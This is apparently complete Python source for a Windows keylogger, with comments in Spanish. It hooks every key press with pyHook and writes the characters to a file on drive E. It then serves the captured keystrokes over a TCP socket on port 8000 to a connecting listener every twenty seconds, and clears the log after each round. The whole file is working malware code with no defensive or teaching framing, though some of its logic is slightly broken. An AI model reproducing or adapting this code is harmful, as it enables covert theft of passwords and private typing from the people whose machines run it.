import pyHook,pythoncom,sys,logging
import time,datetime
import socket

servidor_socket=socket.socket()
servidor_socket.bind(('192.168.1.33',8000))
servidor_socket.listen(5)

esperar_segundos=20
tiempo_fuera=time.time()+esperar_segundos
ubicacion='E:\\data.txt'

#Aceptar conexion
conexion,direccion=servidor_socket.accept()
print(conexion,direccion)

#Aca definimos el esperar segundos
def retardo():
	if(time.time()>tiempo_fuera):
		return(True)
	else:
		return(False)

def Borrador():
	with open(ubicacion,'r+')as f:
		borrador1=f.read().replace('\n',' ');
		f.seek(0)	
		f.truncate()

#Registrador de eventos
def registro(event):
	logging.basicConfig(filename=ubicacion,level=logging.DEBUG,format='%(message)s')
	logging.log(10,chr(event.Ascii))
	return True

Teclado=pyHook.HookManager()
Teclado.KeyDown=registro
Teclado.HookKeyboard()

while 1:
	if(retardo()):
		Borrador()
		tiempo_fuera=time.time()+esperar_segundos
		print('Enviado')
		conexion.send(archivo.encode('UTF-8'))
	pythoncom.PumpWaitingMessages()
	with open(ubicacion,'r')as f:
		archivo=f.read().replace('\n',' ');
	
